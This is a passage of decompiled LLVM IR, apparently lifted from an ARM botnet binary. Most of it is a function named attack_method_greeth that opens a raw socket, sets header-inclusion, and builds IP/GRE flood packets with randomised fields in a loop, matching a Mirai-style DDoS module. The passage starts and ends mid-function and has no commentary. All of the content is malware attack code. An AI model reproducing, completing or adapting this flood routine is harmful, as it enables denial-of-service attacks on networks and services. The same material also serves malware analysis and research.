  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v18_8eec, i32* %sb.global-to-local, align 4
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
